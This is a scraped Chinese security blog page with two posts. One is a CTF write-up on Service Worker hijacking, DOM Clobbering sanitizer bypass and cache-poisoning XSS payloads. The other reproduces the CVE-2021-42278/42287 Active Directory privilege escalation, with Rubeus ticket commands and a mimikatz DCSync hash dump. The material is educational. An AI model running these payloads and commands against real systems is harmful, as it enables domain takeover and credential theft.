        <h1 id="前端安全—湖湘杯2021-Pastebin复现学习"><a href="#前端安全—湖湘杯2021-Pastebin复现学习" class="headerlink" title="前端安全—湖湘杯2021-Pastebin复现学习"></a>前端安全—湖湘杯2021-Pastebin复现学习</h1><h2 id="一、Service-Worker介绍"><a href="#一、Service-Worker介绍" class="headerlink" title="一、Service Worker介绍"></a>一、<code>Service Worker</code>介绍</h2><p>​    <code>Service Worker</code>可以理解为客户端与服务器之间的一个代理服务器。当网站中注册了<code>Service Worker</code>，那么它就可以拦截请求，根据开发者定义的程序，来判断是将请求传送给服务端还是直接通过缓存返回给客户端。</p>
<p>​    下面简单来实现一下<code>Service Worker</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># index.html</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        if(&#x27;serviceWorker&#x27; in navigator)&#123;</span><br><span class="line">            window.addEventListener(&#x27;load&#x27;,function()&#123;</span><br><span class="line">                navigator.serviceWorker.register(&#x27;./ws.js&#x27;,&#123;scope: &#x27;./&#x27;&#125;)</span><br><span class="line">                .then(function (registration) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker registered&#x27;)</span><br><span class="line">                  &#125;)</span><br><span class="line">                .catch(function (err) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker regist failed&#x27;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    简单解释一下代码：首先判断浏览器是否支持<code>Service Worker</code>，然后创建一个<code>Service Worker</code>，并指定其执行的代码以及作用域<code>scope</code>，该作用域表示的内容为拦截指定目录下的所有请求。创建成功之后，会执行<code>then</code>，否则执行<code>catch</code>。</p>
<p>​    在创建<code>Service Worker</code>的时候，指定了运行代码，既可以通过文件的形式指定，也可以直接通过代码的形式执行。接下来我们在<code>ws.js</code>中定义缓存规则代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">this.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">    event.waitUntil(</span><br><span class="line">        caches.open(&#x27;m1sn0w&#x27;).then(function (cache) &#123; </span><br><span class="line">            return cache.addAll([</span><br><span class="line">                &#x27;./index.html&#x27;</span><br><span class="line">            ])</span><br><span class="line">         &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.addEventListener(&#x27;fetch&#x27;,function (event) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">        new Response(&#x27;m1sn0w&#x27;,&#123;headers: &#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;&#125;)</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>​    这个文件中定义了两个事件，一个是<code>install</code>事件，另外一个是<code>fetch</code>事件，<code>install</code>事件一般用来设置浏览器的缓存逻辑，可以指定要缓存的资源路径文件，而<code>fetch</code>事件是拦截请求后所作的动作，例如上面直接页面，内容为<code>m1sn0w</code>。在后续的<code>XSS</code>持久化利用中，主要使用到<code>fetch</code>这个事件。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221132704453.png" alt="image-20211221132704453"></p>
<h2 id="二、劫持Service-Worker"><a href="#二、劫持Service-Worker" class="headerlink" title="二、劫持Service Worker"></a>二、劫持<code>Service Worker</code></h2><p>​    假设存在一个反射型<code>XSS</code>漏洞利用点，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; &gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;xss&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_POST[&#x27;xss&#x27;]))&#123;</span><br><span class="line">            echo $_POST[&#x27;xss&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    如果想要劫持<code>Service Worker</code>的话，还需要一个条件，就是同域环境下需要一个<code>jsonp</code>，因为在后续构造<code>fetch</code>事件的时候，需要这个<code>jsonp</code>来将构造的代码返回，从而被当作执行的代码，例如，我在同域环境下给出一个<code>jsonp</code>（其实只需要能返回<code>GET</code>请求的数据就行）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># evil.js</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&#x27;Content-type: text/javascript&#x27;);</span><br><span class="line">    $callback=$_GET[&#x27;callback&#x27;];</span><br><span class="line">    echo $callback;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>​    这里需要返回头部信息为<code>text/javascript</code>，因为我们需要返回回来的代码被当作<code>JS</code>处理。然后我们构造如下<code>Payload</code>，并指定了缓存路径为<code>./m1sn0w/</code>，通过<code>POST</code>提交上去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">navigator.serviceWorker.register(&#x27;./evil.php?callback=onfetch=function(e)&#123;console.log(1);e.respondWith(new Response(&quot;m1sn0w&quot;,&#123;headers: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;&#125;))&#125;&#x27;,&#123;scope: &#x27;./m1sn0w/&#x27;&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    之后我访问<code>/m1sn0w/</code>目录下的任何文件，都会返回<code>m1sn0w</code>字符。（不管文件是否存在）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221141856042.png" alt="image-20211221141856042"></p>
<h2 id="三、湖湘杯Pastebin"><a href="#三、湖湘杯Pastebin" class="headerlink" title="三、湖湘杯Pastebin"></a>三、湖湘杯<code>Pastebin</code></h2><p>​    这里只探究一下涉及到的两个前端知识点，一个是<code>DOM Clobbering</code>，另外一个就是污染<code>Service Worker</code>来持久化<code>XSS</code>。</p>
<h3 id="1、DOM-Clobbering绕过检验函数"><a href="#1、DOM-Clobbering绕过检验函数" class="headerlink" title="1、DOM Clobbering绕过检验函数"></a>1、<code>DOM Clobbering</code>绕过检验函数</h3><p>​    首先是第一个漏洞，<code>DOM Clobbering</code>，我们根据<code>payload</code>去调试分析一下整条链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;&lt;img src=x onerror=alert(1337)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221163007863.png" alt="image-20211221163007863"></p>
<p>​    在此之前，简单分析一下前端校验代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">async function do_things(id) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var html = await get(id);</span><br><span class="line">        var doc = new DOMParser().parseFromString(html, &quot;text/html&quot;);</span><br><span class="line">        if(doc.querySelectorAll(&quot;math&quot;).length !== 0 || doc.querySelectorAll(&quot;svg&quot;).length !== 0 || doc.querySelectorAll(&quot;base&quot;).length !== 0 || doc.querySelectorAll(&quot;object&quot;).length !== 0)&#123;</span><br><span class="line">            console.log(&quot;filtered&quot;);</span><br><span class="line">            return &quot;&lt;b&gt;Your paste have been filtered&lt;/b&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        html = safepaste.sanitize(html);</span><br><span class="line">    &#125; catch(e) &#123;</span><br><span class="line">        // fetch failed</span><br><span class="line">        console.log(e)</span><br><span class="line">    &#125;</span><br><span class="line">    return html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里用到<code>try...catch</code>语句，但是在<code>catch</code>语句中并没有将程序结束，也就是说<code>catch</code>之后，程序还是会返回<code>html</code>变量。所以这里的思路就是在<code>try</code>语句块中触发报错，从而逃过<code>sanitize</code>函数的检查。经过上下文分析，可以知道<code>html</code>变量是受我们控制的。</p>
<p>​    通过调试代码分析，最终会调用到<code>(new goog.html.sanitizer.HtmlSanitizer).sanitize(a);</code>，而<code>a</code>变量就是受控的<code>html</code>变量。继续跟进<code>sanitize(a)</code>代码，会经过如下函数处理：<code>this.processToString(a)</code>–&gt;<code>this.processToTree(a)</code>–&gt;<code>goog.dom.removeChildren(d)</code>。</p>
<p>​    变量<code>a</code>在<code>processToTree</code>这个函数中进行了一些处理，也就是将字符串转换成了<code>html</code>标签。然后获取了整个标签的父标签，也就是最外层的标签对象，并将其赋值给了<code>d</code>变量。</p>
<p>​    然后将<code>d</code>变量传送给了<code>goog.dom.removeChildren</code>函数处理，我们看看该函数的具体实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goog.dom.removeChildren = function(a) &#123;</span><br><span class="line">    for (var b; b = a.firstChild; ) &#123;</span><br><span class="line">        a.removeChild(b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于这里传入的变量是一个标签对象，了解<code>DOM Clobbering</code>的话就很容易看出来这里存在漏洞。例如传入的数据是<code>&lt;form&gt;</code>标签，其子标签元素<code>input</code>的<code>name</code>值为<code>removeChild</code>，那么上面的<code>a.removeChild</code>表示的就是<code>&lt;input&gt;</code>这个标签对象，而不再是函数，因此，这里最终会报错。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221171935020.png" alt="image-20211221171935020"></p>
<p>​    我在这里加了一个<code>console.log</code>输出变量，最终控制台输出<code>&lt;input&gt;</code>标签对象：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221172024957.png" alt="image-20211221172024957"></p>
<p>​    因此，我们最终构造<code>payload</code>的时候，只需要在前面加上<code>&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;</code>即可逃过校验函数的检测，后面就可以构造<code>xss</code>利用代码。</p>
<h3 id="2、修改Service-Worker缓存"><a href="#2、修改Service-Worker缓存" class="headerlink" title="2、修改Service Worker缓存"></a>2、修改<code>Service Worker</code>缓存</h3><p>​    该题的第二个考点就是污染<code>Service Worker</code>来持久化<code>XSS</code>。先不谈为什么这里需要持久化，我们先单纯地学习一下这个知识点。出题师傅给了一篇论文，<code>https://swcacheattack.secpriv.wien/</code>，我们先对论文里面的内容做一个了解与分析。</p>
<p>​    文章给出的攻击思路，大概就是利用<code>xss</code>漏洞去污染<code>Service Worker</code>缓存，然后将缓存中的一些静态数据修改掉，当用户再次访问页面的时候，由于<code>Service Worker</code>缓存的存在，会直接将缓存的数据返回给用户。而这些缓存的数据，由于被修改了，这样也就达到了攻击用户的目的。</p>
<p>​    我们对文中给出的<code>payload</code>做一个简单的分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let p = `&lt;script&gt;document.querySelector(&#x27;#col-add button&#x27;).addEventListener(&#x27;click&#x27;, (event) =&gt; &#123;alert(&#x27;Password stolen: &#x27; + document.querySelector(&#x27;#col-add input[type=&quot;password&quot;]&#x27;).value);&#125;);&lt;/script&gt;`;</span><br><span class="line">    let t = &#x27;/safenotes/&#x27;;</span><br><span class="line">    let c = await caches.open(&#x27;static&#x27;);</span><br><span class="line">    let r = await c.match(t);</span><br><span class="line">    let rt = await r.text();</span><br><span class="line">    await c.put(t, </span><br><span class="line">      new Response(rt.replace(&#x27;&lt;/body&gt;&#x27;, p + &#x27;&lt;/body&gt;&#x27;), &#123;</span><br><span class="line">        status: 200,</span><br><span class="line">        statusText: &#x27;OK&#x27;,</span><br><span class="line">        headers: r.headers</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>​    这里的<code>caches.open</code>用来打开<code>static</code>缓存空间，然后通过<code>match</code>来寻找缓存文件，这里找到的文件如图所示：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221180339796.png" alt="image-20211221180339796"></p>
<p>​    接下来，它将文件的内容读取出来，然后将构造的<code>payload</code>代码插入到文件内容中，并将更新的文件内容再次写入缓存空间。我们简单分析一下该攻击手法，攻击前提是存在一个<code>XSS</code>漏洞点，然后网站原本开启了<code>Service Worker</code>缓存。利用<code>XSS</code>漏洞，将缓存文件内容替换，从而达到攻击的目的。</p>
<p>​    我们回到这个题目，可以通过查看缓存空间，来获知哪些文件进行了缓存：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223095823428.png" alt="image-20211223095823428"></p>
<p>​    接下来的利用方式就是结合上面的思路，我们修改缓存文件，例如<code>jquery.min.js</code>，当有一个地方引入这个文件的时候，就会触发我们修改添加进去的<code>xss</code>恶意代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let e = &quot;/jquery.min.js&quot;, </span><br><span class="line">        t = await caches.open(&quot;static-resources&quot;), </span><br><span class="line">        a = await t.match(e), </span><br><span class="line">        s = await a.text();</span><br><span class="line">    await t.put(e, new Response(s.replace(&quot;jQuery=C.$=S),S&#125;);&quot;,</span><br><span class="line">        `jQuery=C.$=S),S&#125;);alert(&#x27;xss&#x27;);`),  </span><br><span class="line">        &#123;</span><br><span class="line">            status: 200,</span><br><span class="line">            statusText: &quot;OK&quot;,</span><br><span class="line">            headers: a.headers</span><br><span class="line">        &#125;))</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    在本地简单搭建了一个<code>demo</code>来对此攻击示例做一个测试。在存在<code>xss</code>漏洞点的地方，输入上述<code>payload</code>，结果会导致<code>Jquey</code>缓存文件内容发生了改变，当我们再次访问导入了<code>Jquery</code>的页面的时候，会弹出<code>xss</code>框。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223113329929.png" alt="image-20211223113329929"></p>
<p>​    该题接下来的利用就是分析<code>bot</code>程序的行为，然后修改<code>action</code>属性值，最终将<code>flag</code>数据外带从而拿到<code>flag</code>值。</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/306014.html">https://www.freebuf.com/articles/web/306014.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" data-id="cl8h223i10007b3dp54qc98f6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2021-42278&amp;CVE-2021-42278漏洞复现与分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2021-12-17T03:52:40.000Z" itemprop="datePublished">2021-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2021-42278&amp;CVE-2021-42278漏洞复现与分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2021-42278-amp-CVE-2021-42287漏洞复现与分析"><a href="#CVE-2021-42278-amp-CVE-2021-42287漏洞复现与分析" class="headerlink" title="CVE-2021-42278&amp;CVE-2021-42287漏洞复现与分析"></a>CVE-2021-42278&amp;CVE-2021-42287漏洞复现与分析</h1><p>​    最近域内出现的一个域服务器提权的漏洞，影响很大。而且提权手法相对比较简单，对比于<code>Netlogon</code>权限提升漏洞，这种方式更加普遍，只需要一个域内普通账号，就可以提权至域管。</p>
<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><h3 id="1、CVE-2021-42278"><a href="#1、CVE-2021-42278" class="headerlink" title="1、CVE-2021-42278"></a>1、<code>CVE-2021-42278</code></h3><p>​    一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
<h3 id="2、CVE-2021-42287"><a href="#2、CVE-2021-42287" class="headerlink" title="2、CVE-2021-42287"></a>2、<code>CVE-2021-42287</code></h3><p>​    结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、漏洞细节复现"><a href="#1、漏洞细节复现" class="headerlink" title="1、漏洞细节复现"></a>1、漏洞细节复现</h3><p>​    根据漏洞的描述，我们只需要一个域用户，然后就可以将其提权至域管，从而接管域控，整个漏洞的利用过程大概如下：</p>
<ol>
<li>创建一个机器账户</li>
<li>清除机器账户的<code>SPN</code></li>
<li>修改机器账户的<code>sAMAccountName</code>属性值</li>
<li>使用机器账户请求<code>TGT</code></li>
<li>再次修改机器账户的<code>sAMAccountName</code>属性值</li>
<li>获取高权限<code>ST</code>票据</li>
</ol>
<h4 id="（1）创建机器账户"><a href="#（1）创建机器账户" class="headerlink" title="（1）创建机器账户"></a>（1）创建机器账户</h4><p>​    一般域用户可以创建很多机器账户，这里使用<code>Powermad.ps1</code>来进行机器账号的创建：（创建一个名为<code>m1sn0w$</code>）的机器账号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount m1sn0w -Domain god.org -DomainController owa.god.org -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102443077.png" alt="image-20211217102443077"></p>
<h4 id="（2）清除该机器账号的SPN"><a href="#（2）清除该机器账号的SPN" class="headerlink" title="（2）清除该机器账号的SPN"></a>（2）清除该机器账号的<code>SPN</code></h4><p>​    <code>PowerView.ps1</code>是<code>PowerSploit</code>下的一个工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导入</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">Set-DomainObject &quot;CN=m1sn0w,CN=Computers,DC=god,DC=org&quot; -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102629992.png" alt="image-20211217102629992"></p>
<h4 id="（3）修改机器账号的sAMAccountName属性值"><a href="#（3）修改机器账号的sAMAccountName属性值" class="headerlink" title="（3）修改机器账号的sAMAccountName属性值"></a>（3）修改机器账号的<code>sAMAccountName</code>属性值</h4><p>​    这里就需要利用到<code>CVE-2021-42278</code>漏洞，将<code>sAMAccountName</code>的值改为域控的机器账号名，我们可以通过<code>Nslookup</code>来进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102933168.png" alt="image-20211217102933168"></p>
<p>​    获取到域控的机器账号名之后，我们将自己创建的机器账号的<code>sAMAccountName</code>的值改为域控的机器账号名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount m1sn0w -Value &quot;owa&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217103141242.png" alt="image-20211217103141242"></p>
<h4 id="（4）使用机器账户请求TGT"><a href="#（4）使用机器账户请求TGT" class="headerlink" title="（4）使用机器账户请求TGT"></a>（4）使用机器账户请求<code>TGT</code></h4><p>​    接下来使用刚刚创建生成的机器账号来申请一张<code>TGT</code>票据：（这里将运行结果保存在指定的文件中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:owa /password:qwe123 /domain:god.org /dc:owa.god.org /nowrap /consoleoutfile:2.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217103423301.png" alt="image-20211217103423301"></p>
<h4 id="（5）再次修改机器账户的sAMAccountName属性值"><a href="#（5）再次修改机器账户的sAMAccountName属性值" class="headerlink" title="（5）再次修改机器账户的sAMAccountName属性值"></a>（5）再次修改机器账户的<code>sAMAccountName</code>属性值</h4><p>​    接下来开始利用<code>CVE-2021-42287</code>漏洞，我们首先将机器账号名改回去获取清除掉：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount m1sn0w -Value &quot;m1sn0w&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217104241491.png" alt="image-20211217104241491"></p>
<h4 id="（6）利用S4U2self获取ST票据"><a href="#（6）利用S4U2self获取ST票据" class="headerlink" title="（6）利用S4U2self获取ST票据"></a>（6）利用<code>S4U2self</code>获取<code>ST</code>票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/owa.god.org&quot; /dc:&quot;owa.god.org&quot; /ptt /ticket:TGT值</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217104617192.png" alt="image-20211217104617192"></p>
<h4 id="（7）利用DCSync获取域控下所有用户hash"><a href="#（7）利用DCSync获取域控下所有用户hash" class="headerlink" title="（7）利用DCSync获取域控下所有用户hash"></a>（7）利用<code>DCSync</code>获取域控下所有用户<code>hash</code></h4><p>​    当完成上述所有操作之后，我们就获取到一个高权限的票证。利用此票证，我们通过<code>DCSync</code>获取域内所有用户的<code>Hash</code>值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:god.org /kdc:owa.god.org /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217105228789.png" alt="image-20211217105228789"></p>
<h3 id="2、利用sam-the-admin-py获取shell"><a href="#2、利用sam-the-admin-py获取shell" class="headerlink" title="2、利用sam_the_admin.py获取shell"></a>2、利用<code>sam_the_admin.py</code>获取<code>shell</code></h3><p>​    我们可以利用<code>sam_the_admin.py</code>脚本获取到<code>Shell</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211216125208262.png" alt="image-20211216125208262"></p>
<p>​    从上面输出的信息来看，该工具也是按照上述步骤进行了操作。</p>
<h2 id="三、漏洞影响范围"><a href="#三、漏洞影响范围" class="headerlink" title="三、漏洞影响范围"></a>三、漏洞影响范围</h2><ul>
<li><p>Windows Server 2012 R2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2012 R2</p>
</li>
<li><p>Windows Server 2012 (Server Core installation)</p>
</li>
<li><p>Windows Server 2012</p>
</li>
<li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
</li>
<li><p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
</li>
<li><p>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
</li>
<li><p>Windows Server 2016 (Server Core installation)</p>
</li>
<li><p>Windows Server 2016</p>
</li>
<li><p>Windows Server, version 20H2 (Server Core Installation)</p>
</li>
<li><p>Windows Server, version 2004 (Server Core installation)</p>
</li>
<li><p>Windows Server 2022 (Server Core installation)</p>
</li>
<li><p>Windows Server 2022</p>
</li>
<li><p>Windows Server 2019 (Server Core installation)</p>
</li>
<li><p>Windows Server 2019</p>
</li>
</ul>
<h2 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h2><p>1、更新至最新的安全版本</p>
<p>2、通过域控的 <code>ADSI</code> 编辑器⼯具将 <code>AD</code> 域的 <code>MAQ</code> 配置为 0。</p>
<h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><p>【sAMAccountName spoofing】<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing</a></p>

      
    </div>
    <footer class="article-footer">
